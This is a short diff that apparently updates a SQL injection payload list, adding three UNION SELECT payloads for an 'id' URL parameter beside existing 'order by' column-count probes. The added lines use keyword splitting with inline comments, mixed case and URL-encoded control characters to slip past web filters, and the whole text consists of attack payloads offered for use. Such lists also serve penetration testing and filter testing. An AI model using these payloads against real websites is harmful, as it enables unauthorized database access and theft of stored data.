@@ -20,3 +20,6 @@ WHERE -> HAVING
 order by 1
 order by 2
 order by 3
+?id=1+un/**/ion+se/**/lect+1,2,3--
+?id=1+UnIoN/**/SeLecT/**/1,2,3--
+?id=1%2Buni%0bon%2Bse%0blect%2B1%2C2%2C3--
